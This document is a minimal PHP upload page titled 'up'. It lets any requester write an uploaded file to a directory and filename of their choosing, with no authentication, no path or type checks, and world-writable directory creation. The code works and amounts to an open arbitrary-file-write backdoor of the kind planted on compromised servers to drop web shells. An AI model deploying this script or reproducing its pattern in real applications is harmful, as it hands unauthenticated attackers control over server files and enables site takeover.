<?php

$uploadStatus = '';
$defaultPath = getcwd();  


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $target_dir = $_POST["path"] ?? $defaultPath;
    $filename = $_FILES["fileToUpload"]["name"];
    $customFilename = $_POST["filename"];

    if (!empty($customFilename)) {
        $filename = $customFilename;
    }

    if (!is_dir($target_dir)) {
        mkdir($target_dir, 0777, true); 
    }

    $target_file = rtrim($target_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;

    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        $uploadStatus = "ok: " . htmlspecialchars($target_file);
    } else {
        $uploadStatus = "error。";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>up</title>
</head>
<body>

<form action="upload.php" method="post" enctype="multipart/form-data">
    <label for="path">dir:</label>
    <input type="text" name="path" id="path" value="<?php echo htmlspecialchars($defaultPath); ?>"><br><br>

    <label for="filename">filename（or）:</label>
    <input type="text" name="filename" id="filename"><br><br>

    <input type="file" name="fileToUpload" id="fileToUpload"><br><br>

    <input type="submit" value="上传文件" name="submit">
</form>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    echo "<p>$uploadStatus</p>";
}
?>

</body>
</html>
